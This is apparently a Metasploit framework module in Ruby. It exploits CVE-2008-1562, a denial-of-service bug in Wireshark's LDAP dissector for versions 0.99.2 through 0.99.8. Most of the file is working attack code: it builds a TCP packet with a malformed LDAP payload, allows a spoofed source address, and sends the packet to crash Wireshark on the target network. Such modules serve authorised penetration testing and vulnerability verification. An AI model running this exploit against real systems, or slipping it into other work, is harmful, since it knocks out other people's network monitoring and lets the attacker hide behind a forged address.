##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Capture
  include Msf::Auxiliary::Dos

  def initialize
    super(
      'Name'        => 'Wireshark LDAP Dissector DOS',
      'Description' => %q{
          The LDAP dissector in Wireshark 0.99.2 through 0.99.8 allows remote attackers
          to cause a denial of service (application crash) via a malformed packet.
      },
      'Author'      => ['MC'],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'CVE', '2008-1562' ],
          [ 'OSVDB', '43840' ],
        ],
      'DisclosureDate' => 'Mar 28 2008')

    register_options([
      OptInt.new('RPORT', [true, 'The destination port', 389]),
      OptAddress.new('SHOST', [false, 'This option can be used to specify a spoofed source address', nil])
    ])

    deregister_options('FILTER','PCAPFILE')
  end

  def run

    open_pcap

    print_status("Sending malformed LDAP packet to #{rhost}")

    m = Rex::Text.rand_text_alpha_lower(3)

    p = PacketFu::TCPPacket.new
    p.ip_saddr = datastore['SHOST'] || Rex::Socket.source_address(rhost)
    p.ip_daddr = rhost
    p.tcp_ack = rand(0x100000000)
    p.tcp_flags.syn = 1
    p.tcp_flags.ack = 1
    p.tcp_dport = datastore['RPORT'].to_i
    p.tcp_win = 3072
    p.payload = "0O\002\002;\242cI\004\rdc=#{m},dc=#{m}\n\001\002\n\001\000\002\001\000\002\001\000\001\001\000\241'\243\016"
    p.recalc
    capture_sendto(p, rhost)

    close_pcap

  end
end
